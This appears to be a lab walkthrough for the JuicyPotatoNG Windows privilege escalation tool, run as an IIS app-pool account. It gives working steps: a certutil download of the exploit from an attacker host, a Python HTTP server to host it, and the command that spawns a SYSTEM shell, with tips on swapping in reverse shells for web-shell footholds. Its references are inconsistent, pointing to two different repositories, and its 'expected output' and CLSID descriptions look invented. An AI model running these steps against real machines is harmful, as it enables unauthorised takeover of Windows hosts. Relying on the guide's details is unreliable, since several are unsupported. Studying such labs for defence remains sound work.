# JuicyPotatoNG Exploit Lab - Windows Privilege Escalation

## Lab Environment: JuicyPotatoNG

- Hostname: `PC3`

- OS: Windows 11 IoT Enterprise LTSC (Build 26100)

- IP Address: `192.168.1.62`

- User: `iis apppool\defaultapppool`

- Virtualization: VirtualBox

- Patch Level: Fully patched (5 hotfixes incl. KB5052915)

- SeImpersonatePrivilege:  Required for exploitation

## JuicyPotatoNG

**JuicyPotatoNG** is a local privilege escalation tool that exploits **COM server abuse + token impersonation**, using `SeImpersonatePrivilege`. It improves on the original **JuicyPotato** by:

- Allowing CLSID specification

- Compatible with newer Windows builds

- Supports **medium integrity** exploitation

**GitHub Repo**: [https://github.com/antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)

## Requirements

- Must have `SeImpersonatePrivilege`

- Run from **medium integrity level** (not low integrity like some sandboxed apps)

- Requires a **valid CLSID** with SYSTEM-level permissions

## Step 1: Check Privileges

- Verify that `SeImpersonatePrivilege` is enabled:

```cmd
whoami /priv
````

- Look for this line:

```text
SeImpersonatePrivilege    Enabled
```

> If enabled, you’re good to proceed.

## Step 2: Download JuicyPotatoNG

- From attacker machine (192.168.1.7), host JuicyPotatoNG.exe on HTTP server:

```cmd
certutil.exe -urlcache -split -f "http://192.168.1.7/JuicyPotatoNG.exe" C:\Users\Public\JuicyPotatoNG.exe
```

> Ensure your Python HTTP server is up:

```bash
python3 -m http.server 80
```

## Step 3: Identify CLSID Candidates

- Run the CLSID discovery tool provided in the repo or use built-in COM registry references.

> Example CLSID: `{3E5FC7F9-9A51-4367-9063-A120244FBEC7}`  

This CLSID often works in IIS/Service accounts for SYSTEM token impersonation.

> To enumerate CLSIDs:
>
> Use tools like:
>
> - [PotatoSearcher](https://github.com/ohpe/juicy-potato-ng/blob/master/CLSID/README.md)
>
> - `Get-ChildItem` under registry paths like:
>
>     - `HKCR\CLSID`
>
>     - `HKLM\Software\Classes\CLSID`
>

## Step 4: Exploit with JuicyPotatoNG

### Basic Syntax

```cmd
JuicyPotatoNG.exe -p <path_to_payload> -t <process_type> -c <CLSID> [-l <listen_port>] [-a <args>]
```

### Spawn SYSTEM Shell Example

```cmd
C:\Users\Public\JuicyPotatoNG.exe -p cmd.exe -t * -c {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
```

> `-t *` auto-detects token types  
> Replace `cmd.exe` with a custom payload if needed

Expected output:

```text
[+] Creating COM object...
[+] Found SYSTEM token
[+] Impersonation successful!
[+] Launching cmd.exe as SYSTEM
```

### Confirm SYSTEM Shell

```cmd
whoami
```

> Expected:

```text
nt authority\system
```

## Pro Tips

- If a CLSID fails, try others — not all are usable in every context.

- For full reliability, run in **medium integrity**, not sandboxed.

- You can use this for **reverse shells** instead of spawning cmd.exe.


## Alternative CLSIDs

Here are a few known CLSIDs to try (depending on context):

|CLSID|Description|
|---|---|
|`{3E5FC7F9-9A51-4367-9063-A120244FBEC7}`|MMC DCOM object|
|`{6fcd6c8f-05a0-4d8c-9af9-8a3e5c6e6ab3}`|DCOM Service (depends on patch level)|
|`{4991d34b-80a1-4291-83b6-3328366b9097}`|Shell Browser service|

Test them one by one if you run into issues.


## Summary

- Works on modern Windows (if `SeImpersonatePrivilege` is available)

- Does not rely on Print Spooler

- Still viable post-PrintSpoofer patching

- Ideal for IIS/SQL users in **web shells**, **RCE** footholds, etc.

## Reference Links

- [JuicyPotatoNG GitHub](https://github.com/ohpe/juicy-potato-ng)

- [CLSID Discovery Guide](https://github.com/ohpe/juicy-potato-ng/blob/master/CLSID/README.md)

## Related
- [Impersonation and Potato Attacks](Impersonation-and-Potato-Attacks.md) — parent hub
- [Juicy Potato](Juicy-Potato.md) — original exploit it supersedes
- [God Potato](God-Potato.md) — sibling modern potato
- [Token Impersonation](Token-Impersonation.md) — impersonation-privilege abuse
- [Potato Attacks Lab Setup](Potato-Attacks-Lab-Setup.md) — lab to reproduce the attack
